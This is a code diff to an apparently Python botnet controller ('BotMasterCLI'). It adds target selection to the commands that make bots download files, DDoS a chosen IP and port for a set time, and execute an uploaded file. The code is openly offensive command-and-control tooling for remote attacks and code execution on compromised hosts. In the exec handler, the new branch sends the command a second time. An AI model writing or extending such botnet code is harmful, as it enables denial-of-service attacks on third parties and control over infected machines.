@@ -5,6 +5,7 @@ import requests
 import asyncio
 from websockets.sync.client import connect
 
+
 # URL del bot server
 url = 'http://localhost:3000/'
 
@@ -51,14 +52,26 @@ class BotMasterCLI(cmd.Cmd):
         if len(args_vec) < 2:
             print("Usage: download filepath, name, objective(default All)")
         else:
-            body = {
-                'id': self.command_id,
-                'command': "Download",
-                'filepath': args_vec[0],
-                'objective': "All",
-                'name': args_vec[1]
-            }
-            send_command(body)
+            if len(args_vec) == 3:
+                body = {
+                    'id': self.command_id,
+                    'command': "Download",
+                    'filepath': args_vec[0],
+                    'objective': args_vec[2],
+                    'name': args_vec[1]
+                }
+                send_command(body)
+            else:
+                body = {
+                    'id': self.command_id,
+                    'command': "Download",
+                    'filepath': args_vec[0],
+                    'objective': "All",
+                    'name': args_vec[1]
+                }
+                send_command(body)
+
+
 
     def do_ddos(self, args):
         """DDoS a target IP(Args: ip, port, time(in seconds), objective(default All)"""
@@ -66,15 +79,27 @@ class BotMasterCLI(cmd.Cmd):
         if len(args_vec) < 3:
             print("Usage: ddos ip, port, time(in seconds), objective(default All)")
         else:
-            body = {
-                'id': self.command_id,
-                'command': "DDoS",
-                'ip': args_vec[0],
-                'objective': "All",
-                'port': args_vec[1],
-                'time': args_vec[2]
-            }
-            send_command(body)
+            if len(args_vec) == 4:
+                body = {
+                    'id': self.command_id,
+                    'command': "DDoS",
+                    'ip': args_vec[0],
+                    'objective': args_vec[3],
+                    'port': args_vec[1],
+                    'time': args_vec[2]
+                }
+                send_command(body)
+            else:
+                body = {
+                    'id': self.command_id,
+                    'command': "DDoS",
+                    'ip': args_vec[0],
+                    'objective': "All",
+                    'port': args_vec[1],
+                    'time': args_vec[2]
+                }
+                send_command(body)
+
 
     def do_exec(self, args):
         """Send a file to execute in the bots(Args: filename, objective(default All)"""
@@ -95,6 +120,26 @@ class BotMasterCLI(cmd.Cmd):
                         'data': data
                     }
                     send_command(body)
+                    if len(args_vec) == 2:
+                        body = {
+                            'id': self.command_id,
+                            'command': "Exec",
+                            'name': args_vec[0],
+                            'objective': args_vec[1],
+                            'data': data
+                        }
+                        send_command(body)
+                    else:
+                        body = {
+                            'id': self.command_id,
+                            'command': "Exec",
+                            'name': args_vec[0],
+                            'objective': "All",
+                            'data': data
+                        }
+                        send_command(body)
+
+
             except FileNotFoundError:
                 print(f"File '{filename}' not found.")
             except Exception as e:
